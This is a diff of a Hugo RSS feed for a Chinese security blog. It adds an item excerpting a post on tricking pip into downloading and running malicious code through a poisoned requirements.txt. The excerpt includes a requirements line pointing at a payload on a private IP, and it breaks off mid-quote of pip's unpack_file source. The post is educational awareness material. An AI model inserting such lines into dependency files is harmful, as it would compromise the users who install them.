@@ -6,8 +6,34 @@
     <description>Recent content in 黑客 on Me0w00f Security </description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <copyright>This is a customized copyright.</copyright>
-    <lastBuildDate>Sun, 09 Oct 2022 13:47:29 +0800</lastBuildDate><atom:link href="https://me0w00f.github.io/tags/%E9%BB%91%E5%AE%A2/index.xml" rel="self" type="application/rss+xml" />
+    <copyright>Copyleft 2022 Me0w00f Security</copyright>
+    <lastBuildDate>Sun, 13 Nov 2022 11:57:09 +0800</lastBuildDate><atom:link href="https://me0w00f.github.io/tags/%E9%BB%91%E5%AE%A2/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>利用pip下载并执行恶意代码的姿势</title>
+      <link>https://me0w00f.github.io/posts/pip/</link>
+      <pubDate>Sun, 13 Nov 2022 11:57:09 +0800</pubDate>
+      
+      <guid>https://me0w00f.github.io/posts/pip/</guid>
+      <description>各位在安装各种python项目的依赖项的时候会不会仔细去看看安装的究竟是什么捏?
+还是更加倾向于直接
+1 pip install -r requirements.txt 我相信大部分人肯定倾向于后者 (实际上我在做这个实验之前也是这样)
+那么接下来就来一起看看这样&amp;quot;偷懒&amp;quot;的惨痛后果吧 :) 免责声明 在阅读以下文章内容前，请阅读以下免责声明
+本篇文章内容包含部分带有攻击性的内容, 仅供网络安全技术学习与交流使用
+如有不当使用文章中的技术造成损害的, 后果自负
+文章中的实验均在虚拟环境中进行
+所以，请不要搞事情= =
+场景模拟 A: 最近有一个好用的python工具,有人要试试吗?
+B: 好呀好呀, 速速发我
+于是乎, B接受了A发送的工具
+A: 对了, 这个工具需要安装依赖包,你运行一下这个指令
+1 pip install -r requirements.txt 但是捏, 这个requirements.txt其中加了一点《料》
+http://192.168.188.128/test.png 由于B没有检查requirements.txt的内容,直接运行了指令,
+pip就下载并执行了A准备好的恶意的代码
+B: 诶? 鼠标怎么自己动起来了???
+本质原理 我们可以去看一下pip的这段源码
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 def unpack_file( filename: str, location: str, content_type: Optional[str] = None, ) -&amp;gt; None: filename = os.</description>
+    </item>
+    
     <item>
       <title>写几个 Misc 的 WP</title>
       <link>https://me0w00f.github.io/posts/somewp/</link>
